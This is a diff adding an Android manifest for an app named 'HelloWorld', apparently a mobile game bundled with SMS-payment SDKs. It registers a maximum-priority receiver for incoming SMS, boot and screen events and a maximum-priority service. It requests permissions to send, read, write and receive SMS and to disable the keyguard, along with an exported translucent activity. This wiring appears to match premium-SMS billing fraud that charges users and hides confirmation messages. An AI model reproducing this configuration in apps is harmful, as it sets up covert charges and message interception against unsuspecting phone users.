@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.example.HelloWorld">
+
+    <uses-sdk android:minSdkVersion="8" />
+    <application
+        android:name="com.example.HelloWorld.App"
+        android:icon="@drawable/icon"
+        android:label="@string/app_name">
+
+        <activity
+            android:name="com.example.HelloWorld.HelloWorld"
+            android:configChanges="orientation"
+            android:label="@string/app_name"
+            android:screenOrientation="landscape"
+            android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name="com.mobile.bumptech.ordinary.miniSDK.SDK.intf.MActivity"
+            android:configChanges="orientation|keyboardHidden|screenSize"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
+
+        <activity
+            android:name="com.y7.smspay.Activity"
+            android:screenOrientation="portrait" />
+
+        <service android:name="com.y7.smspay.Service">
+            <intent-filter>
+                <action android:name="intent.action.HEJU" />
+            </intent-filter>
+        </service>
+
+        <service android:name="com.y7.smspay.mp.srv.Ms" />
+
+        <service android:name="com.wyzf.service.InitService" />
+
+        <receiver android:name="com.mn.kt.rs.RsRe">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.BATTERY_CHANGED" />
+                <action android:name="android.intent.action.SIM_STATE_CHANGED" />
+                <action android:name="android.intent.action.NOTIFICATION_ADD" />
+                <action android:name="android.intent.action.SERVICE_STATE" />
+                <action android:name="android.intent.action.NOTIFICATION_REMOVE" />
+                <action android:name="android.intent.action.NOTIFICATION_UPDATE" />
+                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED" />
+                <action android:name="android.intent.action.ANY_DATA_STATE" />
+                <action android:name="android.net.wifi.STATE_CHANGE" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name="com.mn.kt.rs.RsSe">
+            <intent-filter android:priority="2147483647">
+                <action android:name="com.door.pay.sdk.app.action" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </service>
+
+
+        <!-- 包Id-->
+        <meta-data
+            android:name="Y-PSDK-PID"
+            android:value="@string/gw_packageId" />
+        <!-- 游戏Id
+        7 - 土豪炸翻天 -->
+        <meta-data
+            android:name="Y-PSDK-GAMEID"
+            android:value="@string/gw_gameId" />
+        <!-- 开起关闭应急  0为关闭 -->
+        <meta-data
+            android:name="PSDK_REQUEST"
+            android:value="0" />
+
+        <meta-data
+            android:name="UMENG_APPKEY"
+            android:value="@string/uMengKey" />
+        <meta-data
+            android:name="UMENG_CHANNEL"
+            android:value="@string/uMengChannel" />
+        <meta-data
+            android:name="hKey"
+            android:value="@string/bfg_key" />
+
+    </application>
+    <supports-screens
+        android:anyDensity="true"
+        android:largeScreens="true"
+        android:normalScreens="true"
+        android:smallScreens="true" />
+
+    <!--文件操作-->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+
+    <!--网络相关-->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+
+    <!--定位相关-->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!--系统相关-->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.RESTART_PACKAGES" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <!--短信操作-->
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+</manifest>
